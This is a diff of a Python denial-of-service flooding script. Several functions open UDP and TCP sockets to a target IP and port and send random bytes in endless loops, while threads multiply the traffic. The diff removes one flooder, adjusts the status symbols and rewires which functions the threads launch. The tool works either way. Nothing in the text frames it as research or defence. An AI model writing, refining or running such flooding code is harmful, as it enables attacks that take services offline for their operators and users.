@@ -87,7 +87,7 @@ time.sleep(5),
 
 def run():
 	data = random._urandom(1024)
-	i = random.choice(("[+]","[*]","[#]","[×]","[-]"))
+	i = random.choice(("[+]","[*]","[×]","[-]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -100,7 +100,7 @@ def run():
 
 def run2():
 	data = random._urandom(999)
-	i = random.choice(("[+]","[*]","[#]","[×]","[-]"))
+	i = random.choice(("[+]","[*]","[×]","[-]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -115,7 +115,7 @@ def run2():
 			
 def run3():
 	data = random._urandom(818)
-	i = random.choice(("[+]","[*]","[#]","[×]","[-]"))
+	i = random.choice(("[+]","[*]","[×]","[-]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -128,21 +128,7 @@ def run3():
 			s.close()
 			print("[-]  \033[31mMay be down\033[0m")
             
-def run4():
-	data = random._urandom(16)
-	i = random.choice(("[+]","[*]","[#]","[×]","[-]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print("[×]  \033[97m---------------------------------------------------\033[0m")
-		except:
-			s.close()
-			print("[-]  \033[31mMay be down\033[0m")
-											
+								
             
 for y in range(threads):
 	if choice == 'y':
@@ -150,9 +136,7 @@ for y in range(threads):
 		th.start()
 		th = threading.Thread(target = run2)
 		th.start()
-		th = threading.Thread(target = run3)
-		th.start()
 	else:
-	        th = threading.Thread(target = run4)
+	        th = threading.Thread(target = run3)
 		
 		
